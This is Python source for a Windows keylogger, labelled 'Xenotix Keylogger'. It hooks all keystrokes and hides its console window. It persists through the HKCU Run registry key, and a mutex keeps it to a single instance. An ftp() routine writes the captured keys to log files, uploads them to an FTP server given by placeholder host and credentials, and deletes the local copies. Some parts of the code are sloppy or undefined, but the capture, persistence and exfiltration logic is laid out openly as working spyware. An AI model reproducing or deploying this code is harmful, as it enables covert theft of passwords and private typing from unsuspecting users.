import pythoncom, pyHook
import os
import sys
import threading
import urllib, urllib2
import smtplib
import ftplib
import datetime, time
import win32event, win32api, winerror
from _winreg import *

mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print
    "Error"
    exit(0)
x = ''
data = ''
count = 0

def hide():
    import win32console, win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True

def addStartup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split("\\")[-1]
    new_file_path = fp + "\\" + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change = OpenKey(HKEY_CURRENT_USER,
                         keyVal, 0, KEY_ALL_ACCESS)

    SetValueEx(key2change, "Xenotix Keylogger", 0, REG_SZ, new_file_path)


#def local():
#    global data
#    if len(data) > 100:
#        fp = open("keylogs.txt", "a")
#        fp.write(data)
#        fp.close()
#        data = ''
#    return True


def ftp():
    global data, count
    if len(data) > 100:
        count += 1
        FILENAME = "logs-" + str(count) + ".txt"
        fp = open(FILENAME, "a")
        fp.write(data)
        fp.close()
        data = ''
        try:
            SERVER = "ftp.test.com"  # Specify your FTP Server address
            USERNAME = "ftp_user"  # Specify your FTP Username
            PASSWORD = "ftp_pasword"  # Specify your FTP Password
            SSL = 0  # Set 1 for SSL and 0 for normal connection
            OUTPUT_DIR = "/folder/"  # Specify output directory here
            if SSL == 0:
                ft = ftplib.FTP(SERVER, USERNAME, PASSWORD)
            elif SSL == 1:
                ft = ftplib.FTP_TLS(SERVER, USERNAME, PASSWORD)
            ft.cwd(OUTPUT_DIR)
            fp = open(FILENAME, 'rb')
            cmd = 'STOR' + ' ' + FILENAME
            ft.storbinary(cmd, fp)
            ft.quit()
            fp.close()
            os.remove(FILENAME)
        except Exception as e:
            print
            e
    return True

def main():
    global x

    addStartup()
    x = 4
    hide()

    return True

if __name__ == '__main__':
    main()

def keypressed(event):
    global x, data
    if event.Ascii == 13:
        keys = '<ENTER>'
    elif event.Ascii == 8:
        keys = '<BACK SPACE>'
    elif event.Ascii == 9:
        keys = '<TAB>'
    else:
        keys = chr(event.Ascii)
    data = data + keys
    if x == 1:
        local()
    elif x == 2:
        remote()
    elif x == 4:
        ftp()

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()